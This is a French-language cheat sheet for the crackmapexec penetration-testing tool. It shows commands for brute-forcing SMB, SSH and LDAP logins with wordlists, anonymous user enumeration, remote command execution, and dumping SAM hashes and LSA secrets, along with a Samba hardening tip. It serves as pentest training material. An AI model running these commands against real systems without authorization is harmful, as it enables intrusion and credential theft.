# crackmapexec — cheat sheet

> Outil offensif spécialisé Windows/Active Directory. Supporte SMB, LDAP, SSH, RDP, WINRM, MSSQL, FTP.
> À utiliser uniquement sur des systèmes dont tu as l'autorisation.

---

## syntaxe de base

```bash
crackmapexec <protocole> <IP> -u <user> -p <password>
crackmapexec <protocole> <IP> -u <user> -P <wordlist>
crackmapexec <protocole> <IP/range> -u <users_list> -P <wordlist>
```

---

## protocoles supportés

```bash
crackmapexec smb   192.168.1.10    # SMB — le plus utilisé
crackmapexec ssh   192.168.1.10    # SSH
crackmapexec ftp   192.168.1.10    # FTP
crackmapexec rdp   192.168.1.10    # Remote Desktop (Windows)
crackmapexec winrm 192.168.1.10    # Windows Remote Management
crackmapexec mssql 192.168.1.10    # SQL Server
crackmapexec ldap  192.168.1.10    # Active Directory LDAP
```

---

## flags essentiels

| flag | effet |
|------|-------|
| `-u <user>` | username unique |
| `-U <fichier>` | liste de usernames |
| `-p <pass>` | password unique |
| `-P <fichier>` | wordlist de passwords |
| `--shares` | lister les shares SMB accessibles |
| `--users` | énumérer les utilisateurs |
| `--groups` | énumérer les groupes |
| `--rid-brute` | RID cycling pour trouver des users anonymement |
| `--local-auth` | authentification locale (pas domaine AD) |
| `-x <cmd>` | exécuter une commande distante si admin |
| `--sam` | dumper la base SAM Windows (hashes locaux) |
| `--lsa` | dumper les secrets LSA |
| `-o <fichier>` | sauvegarder les résultats |

---

## lire les résultats

```
SMB  192.168.1.10  445  MACHINE  [+] DOMAIN\user:password        ← credentials valides
SMB  192.168.1.10  445  MACHINE  [-] DOMAIN\user:wrong STATUS_LOGON_FAILURE  ← invalides
SMB  192.168.1.10  445  MACHINE  [+] DOMAIN\user:password (Pwn3d!)  ← admin local
```

- `[+]` — succès
- `[-]` — échec
- `(Pwn3d!)` — accès administrateur local — tu peux exécuter des commandes

---

## exemples SMB

```bash
# tester un credential unique
crackmapexec smb 192.168.1.10 -u kottak -p kottak

# lister les shares accessibles
crackmapexec smb 192.168.1.10 -u kottak -p kottak --shares

# énumérer les utilisateurs anonymement
crackmapexec smb 192.168.1.10 -u '' -p '' --rid-brute

# brute force avec wordlist
crackmapexec smb 192.168.1.10 -u users.txt -P rockyou.txt

# scanner tout un réseau
crackmapexec smb 192.168.1.0/24 -u admin -p password

# exécuter une commande si admin
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"

# dumper les hashes SAM (admin requis)
crackmapexec smb 192.168.1.10 -u admin -p password --sam
```

---

## exemples SSH

```bash
crackmapexec ssh 192.168.1.10 -u root -p toor
crackmapexec ssh 192.168.1.10 -u users.txt -P rockyou.txt
crackmapexec ssh 192.168.1.10 -u admin -p password -x "id"
```

---

## exemples LDAP (Active Directory)

```bash
# énumérer les utilisateurs AD anonymement
crackmapexec ldap 192.168.1.10 -u '' -p '' --users

# avec credentials valides
crackmapexec ldap 192.168.1.10 -u user -p password --users
crackmapexec ldap 192.168.1.10 -u user -p password --groups
crackmapexec ldap 192.168.1.10 -u user -p password --password-not-required
```

---

## piège : map to guest = bad user

Sur Samba avec `map to guest = bad user` :
- crackmapexec retourne `[+]` même avec un mauvais mot de passe
- La connexion aboutit en mode guest
- La colonne `Permissions` des shares sera vide

**Solution** — utiliser `--shares` pour comparer les permissions :
```bash
crackmapexec smb IP -u user -p bonmdp --shares    # → READ, WRITE visibles
crackmapexec smb IP -u user -p mauvaismdp --shares # → permissions vides
```

Ou désactiver `map to guest` sur la cible :
```ini
map to guest = never
restrict anonymous = 2
```

---

## crackmapexec vs hydra

| | crackmapexec | hydra |
|--|-------------|-------|
| SMBv2/v3 | oui | non |
| Active Directory | oui — spécialisé | basique |
| énumération post-auth | oui (`--shares`, `--users`...) | non |
| protocoles | SMB, LDAP, SSH, RDP, WINRM, MSSQL | ~50 protocoles |
| exécution de commandes | oui si admin | non |

**Règle :** SMB / environnement Windows → crackmapexec. SSH, FTP, PostgreSQL, MySQL → hydra.